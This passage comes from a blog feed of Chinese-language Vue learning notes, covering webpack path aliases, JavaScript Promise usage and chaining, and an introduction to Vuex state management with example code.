          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路径别名配置</title>
      <link href="/learningNotes/vue/07%20%E5%B0%81%E8%A3%85tabbar%E7%9A%84%E7%9F%A5%E8%AF%86"/>
      <url>/learningNotes/vue/07%20%E5%B0%81%E8%A3%85tabbar%E7%9A%84%E7%9F%A5%E8%AF%86</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><p>在webpack.base.conf.js 里</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">resolve</span>:&#123;</span><br><span class="line">    <span class="attr">extensions</span>:[<span class="string">&#x27;.js&#x27;</span>,<span class="string">&#x27;.vue&#x27;</span>,<span class="string">&#x27;.json&#x27;</span>],</span><br><span class="line">    <span class="attr">alias</span>:&#123;</span><br><span class="line">        <span class="string">&#x27;@&#x27;</span>:<span class="title function_">resolve</span>(<span class="string">&#x27;src&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;assets&#x27;</span>:<span class="title function_">resolve</span>(<span class="string">&#x27;src/assets&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;components&#x27;</span>:<span class="title function_">resolve</span>(<span class="string">&#x27;src/components&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;views&#x27;</span>:<span class="title function_">resolve</span>(<span class="string">&#x27;src/views&#x27;</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用时：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;img solt=&#x27;item-icon&#x27; src=&#x27;~assets/img/tabbar/home.svg&#x27;&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Promise 简述</title>
      <link href="/learningNotes/vue/08%20Promise"/>
      <url>/learningNotes/vue/08%20Promise</url>
      
        <content type="html"><![CDATA[<h2 id="1.-promise简介">1. Promise简介<a title="#1.-promise简介" href="#1.-promise简介"></a></h2><ul><li>Promise 是异步编程的一种解决方案</li></ul><h2 id="2.-网络请求的回调地狱">2. 网络请求的回调地狱<a title="#2.-网络请求的回调地狱" href="#2.-网络请求的回调地狱"></a></h2><blockquote><p>简述：</p><p>需要通过url1从服务器加载一个数据data1，data1中包含了下一个请求的url2；</p><p>需要通过data1取出url2，从服务器加载数据data2，data2包含了下一个请求的url3；</p><p>需要通过data2取出url3，从服务器加载数据data3，data3包含了下一个请求的url4；</p><p>发送网络请求url4，获取最终的数据data4</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(<span class="string">&#x27;url1&#x27;</span>,<span class="keyword">function</span>(<span class="params">data1</span>)&#123;</span><br><span class="line">    $.<span class="title function_">ajax</span>(data1[<span class="string">&#x27;url2&#x27;</span>],<span class="keyword">function</span>(<span class="params">data2</span>)&#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(data1[<span class="string">&#x27;url3&#x27;</span>],<span class="keyword">function</span>(<span class="params">data3</span>)&#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(data1[<span class="string">&#x27;url4&#x27;</span>],<span class="keyword">function</span>(<span class="params">data4</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(data4);</span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>这样的代码难看且不易维护</p><p>更加期望用一种更加优雅的方式来进行这种异步操作——promise</p></blockquote><h2 id="3.定时器的异步事件">3.定时器的异步事件<a title="#3.定时器的异步事件" href="#3.定时器的异步事件"></a></h2><blockquote><p>使用定时器模拟异步操作</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 使用setTimeout</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;,<span class="number">1000</span>)</span><br></pre></td></tr></table></figure></blockquote><p>上述是我们过去的处理方式，将其转换成promise代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数 -&gt; 函数(resolve,reject)</span></span><br><span class="line"><span class="comment">// resolve,reject本身也是函数</span></span><br><span class="line"><span class="comment">// 链式编程</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//成功时调用 resolve</span></span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line">        <span class="comment">//失败时 调用reject</span></span><br><span class="line">        <span class="title function_">reject</span>(<span class="string">&#x27;Error Data&#x27;</span>)</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li><p>什么时候会用到promise？</p><p>一般是有异步操作时，使用promise对这个异步操作进行封装</p></li><li><p>怎么使用</p><p>new -&gt; 构造函数（1.保存了一些状态信息 2.执行传入的函数）</p><p>在执行传入的回调函数时，会传入两个参数，resolve，reject，其本身也是函数</p></li></ul><h2 id="3.promise三种状态">3.Promise三种状态<a title="#3.promise三种状态" href="#3.promise三种状态"></a></h2><ul><li>在开发中有异步操作时，就可以给异步操作包装一个Promise。异步操作之后会有三种状态:<ul><li>pending：等待状态，如：正在进行网路请求，或者定时器没有到时间</li><li>fulfill：满足状态，当主动回调了resolve时，就处于该状态，并且会回调.then()</li><li>reject：拒绝状态，当主动回调了reject时，就处于该状态，并且会回调.catch()</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// promise 的另外处理形式</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;Hello Vuejs&#x27;</span>)</span><br><span class="line">        <span class="comment">// reject(&#x27;error message&#x27;)</span></span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span><br><span class="line">&#125;,<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="4-promise-链式调用">4 Promise 链式调用<a title="#4-promise-链式调用" href="#4-promise-链式调用"></a></h2><ul><li>在Promise的流程图中，无论时then还是catch都可以返回一个Promise对象</li><li>所以，代码可以进行链式调用：<ul><li>直接通过Promise包装新的数据，将Promise对象返回</li><li>Promise.resolve()：将数据包装成Promise对象，并且在内部调用回调resolve()函数</li><li>Promise。reject()：将数据包装成Promise对象，并且在内部回调reject()函数</li></ul></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wapped into </span></span><br><span class="line"><span class="comment">//网络请求：aaa -&gt; 自己处理</span></span><br><span class="line"><span class="comment">// 处理: aaa111 -&gt; 自己处理</span></span><br><span class="line"><span class="comment">// 处理: aaa111222 -&gt; 自己处理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    &#125;,<span class="number">1000</span>)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">//自己处理</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对结果进行第一次处理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(res + <span class="string">&#x27;111&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">     <span class="comment">//自己处理</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对结果进行第二次处理</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">resolve</span>(res + <span class="string">&#x27;222&#x27;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res)</span><br><span class="line">&#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>链式调用简写</p><ul><li>if希望数据直接包装成Promise.resolve，那么在then中可以直接返回数据</li><li>当把return Promise.resolve(data) 改成return data时结果也是一样的</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">//对结果进行第一次处理</span></span><br><span class="line">   <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">       <span class="title function_">resolve</span>(res + <span class="string">&#x27;111&#x27;</span>)</span><br><span class="line">   &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 使用return Promise.resolve/reject</span></span><br><span class="line"><span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(res + <span class="string">&#x27;111&#x27;</span>)</span><br><span class="line">/</span><br><span class="line">   <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">reject</span>(<span class="string">&#x27;error message&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 省略Promise.resolve</span></span><br><span class="line"><span class="keyword">return</span> res + <span class="string">&#x27;111&#x27;</span></span><br><span class="line">/ </span><br><span class="line">   <span class="keyword">throw</span> <span class="string">&#x27;error message&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="5.-链式调用二">5. 链式调用二<a title="#5.-链式调用二" href="#5.-链式调用二"></a></h2><blockquote><p>简述：如果一个结果需要两个请求成功后才能得到</p><p>那没有使用Promise时是这样的</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> isResult1 = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">let</span> isResult2 = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//请求1</span></span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;result1&#x27;</span>);</span><br><span class="line">        isResult1 = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">handleResult</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//请求2</span></span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;result2&#x27;</span>);</span><br><span class="line">        isResult2 = <span class="literal">true</span>;</span><br><span class="line">        <span class="title function_">handleResult</span>()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handleResult</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(isResult1 &amp;&amp; isResult2)&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Promise.all</strong></p><p>使用Promise</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">all</span>([</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">reslove,reject</span>) =&gt;</span> &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">        $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">            <span class="attr">url</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="attr">success</span>:<span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">                <span class="title function_">resolve</span>(data)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">]).<span class="title function_">then</span>(<span class="function"><span class="params">results</span> =&gt;</span> &#123;</span><br><span class="line">    results[<span class="number">0</span>]</span><br><span class="line">    results[<span class="number">1</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> learningNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> es6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>09 Vuex</title>
      <link href="/learningNotes/vue/09%20Vuex"/>
      <url>/learningNotes/vue/09%20Vuex</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="1.vue的概念和作用解析">1.Vue的概念和作用解析<a title="#1.vue的概念和作用解析" href="#1.vue的概念和作用解析"></a></h2><h3 id="1.1-vuex-是做什么的">1.1 Vuex 是做什么的<a title="#1.1-vuex-是做什么的" href="#1.1-vuex-是做什么的"></a></h3><p>官方解释：Vuex是一个专门为Vue.js应用程序开发的状态管理模式。</p><p>采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。</p><p>Vuex也集成到Vue的官方调试工具<code>devtools extension</code>，提供了诸如零配置的<code>time-travel</code>调试、状态快照导入导出等高级调试功能。</p><blockquote><p>状态管理模式相当于 封装一个大家都能访问的对象里 但Vuex跟自己封装的对象不一样的就是Vuex 实现了响应式</p><p><code>Vuex就是为了提供这样一个在多个组件间共享状态的插件</code></p></blockquote><h3 id="1.2-管理什么状态呢？">1.2 管理什么状态呢？<a title="#1.2-管理什么状态呢？" href="#1.2-管理什么状态呢？"></a></h3><p>比如：用户的登录状态、用户名称、头像等</p><p>比如：商品的收藏、购物车中的物品等</p><p>这些状态信息，我们都可以放在统一的地方，对它进行保存和管理，而且他们还是响应式的</p><h3 id="1.3-单页面的状态管理">1.3 单页面的状态管理<a title="#1.3-单页面的状态管理" href="#1.3-单页面的状态管理"></a></h3><img src='https://s1.328888.xyz/2022/04/09/XaTeC.png' style="zoom:67%;" ><p>State：状态—data中的属性</p><p>View：视图层，可以针对State的变化，显示不同的信息—模板</p><p>Actions：用户的各种操作，会导致状态的改变—方法</p><h3 id="1.4-多界面状态管理">1.4 多界面状态管理<a title="#1.4-多界面状态管理" href="#1.4-多界面状态管理"></a></h3><p>Vuex–全局单例模式 （大管家）—Vuex背后的思想</p><ul><li>将共享的状态抽取出来，交给大管家，统一管理</li><li>每个视图，按照规定好的规定，进行访问和修改等操作</li></ul><h3 id="1.5-vuex状态管理图例">1.5 Vuex状态管理图例<a title="#1.5-vuex状态管理图例" href="#1.5-vuex状态管理图例"></a></h3><img src='https://s1.328888.xyz/2022/04/09/XacDg.png' style="zoom:50%;" ><p>Devtools ：记录每一次status修改的状态，所以官方网站推荐改vuex时，在这里改</p><p>如果绕过mutations，就没法跟踪修改的状态</p><blockquote><p>mutations 同步操作，所以只有同步操作时可以绕过actions</p><p>actions 异步操作时 如网络请求</p></blockquote><p>backend：后端</p><h3 id="1.6-安装devtools插件">1.6 安装devtools插件<a title="#1.6-安装devtools插件" href="#1.6-安装devtools插件"></a></h3><p>在f12中 的更多 如果又看到vue 就安装成功</p><h2 id="2.-vuex的使用">2. Vuex的使用<a title="#2.-vuex的使用" href="#2.-vuex的使用"></a></h2><h3 id="2.1-vuex的下载">2.1 Vuex的下载<a title="#2.1-vuex的下载" href="#2.1-vuex的下载"></a></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install vuex --save @<span class="number">3.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><h3 id="2.2-vuex使用">2.2 Vuex使用<a title="#2.2-vuex使用" href="#2.2-vuex使用"></a></h3><ol><li><p>把Vuex插件导入</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.安装插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建实例</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>一般不在main中写，重建文件夹，store，创建index.js</p><blockquote><p>导入模块   安装插件 创建store对象 导出对象   在main挂载Vue.prototype.$store = store</p><p>在state保存状态</p><p>在mutations写方法 修改state</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vuex</span> <span class="keyword">from</span> <span class="string">&#x27;vuex&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.安装插件</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Vuex</span>)   <span class="comment">//底层会执行这个插件的方法 ： Vuex.install</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.创建对象</span></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> <span class="title class_">Vuex</span>.<span class="title class_">Store</span>(&#123;</span><br><span class="line">    <span class="attr">state</span>:&#123;</span><br><span class="line">        <span class="attr">counter</span>:<span class="number">1000</span></span><br><span class="line">    &#125;,     <span class="comment">//保存状态</span></span><br><span class="line">    <span class="attr">mutations</span>: &#123;</span><br><span class="line">        <span class="comment">//方法</span></span><br><span class="line">        <span class="title function_">increment</span>(<span class="params">state</span>) &#123;</span><br><span class="line">            state.<span class="property">counter</span>++;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="title function_">decrement</span>(<span class="params">state</span>) &#123;</span><br><span class="line">            state.<span class="property">counter</span>--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">actions</span>:&#123;&#125;,</span><br><span class="line">    <span class="attr">getters</span>:&#123;&#125;,</span><br><span class="line">    <span class="attr">modules</span>:&#123;&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.导出store对象</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store</span><br><span class="line"></span><br><span class="line"><span class="comment">//在main.js挂载</span></span><br><span class="line"><span class="keyword">import</span> stroe <span class="keyword">from</span> <span class="string">&#x27;./stroe&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这样才会 多个组件使用它</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">$store</span> = store</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在其他页面使用counter</p><blockquote><p>使用state的状态 $store.state.counter</p><p>使用里面的方法 $store.commit(“方法名”)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//app.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h2&gt;------app内容：直接compontens 修改 state -------&lt;/h2&gt;</span><br><span class="line">&lt;h2&gt;&#123;&#123;$store.state.counter&#125;&#125;&lt;/h2&gt;</span><br><span class="line">&lt;button @click=&#x27;$store.state.counter++&#x27;&gt;+&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;h2&gt;--------vuex内容：使用nutations--------&lt;/h2&gt;</span><br><span class="line">&lt;button @click=&#x27;sub&#x27;&gt;-&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import HelloVuex from &quot;./components/HelloVuex&quot;;</span><br><span class="line">export default &#123;</span><br><span class="line">name: &quot;App&quot;,</span><br><span class="line">components: &#123;</span><br><span class="line">HelloVuex,</span><br><span class="line">&#125;,</span><br><span class="line">data() &#123;</span><br><span class="line">return &#123;</span><br><span class="line">message: &quot;我是app组件&quot;,</span><br><span class="line">// counter: 0,</span><br><span class="line">&#125;;</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">add() &#123;</span><br><span class="line">return this.$store.commit(&quot;increment&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">sub() &#123;</span><br><span class="line">return this.$store.commit(&quot;decrement&quot;);</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><img src='https://s1.328888.xyz/2022/04/09/Xamw1.jpg' style="zoom: 50%;" ></li></ol><h2 id="3.vuex核心概念（p133-2021/05/01)">3.Vuex核心概念（p133 2021/05/01)<a title="#3.vuex核心概念（p133-2021/05/01)" href="#3.vuex核心概念（p133-2021/05/01)"></a></h2><h3 id="3.1-state-单一状态树">3.1 State 单一状态树<a title="#3.1-state-单一状态树" href="#3.1-state-单一状态树"></a></h3><blockquote><p>相当于data</p></blockquote><p>一个项目就一个store</p><h3 id="3.2-getters">3.2 Getters<a title="#3.2-getters" href="#3.2-getters"></a></h3><blockquote><p>相当于computed</p></blockquote><p>与计算属性相似，如果要发生什么变化再给其他组件使用</p><ol><li><p>如果要对数据产生什么变化，就直接在getters变化后，去使用就可以了</p><ul><li><p>在getters定义计算属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getters</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">powCounter</span>(<span class="params">state</span>)&#123;</span><br><span 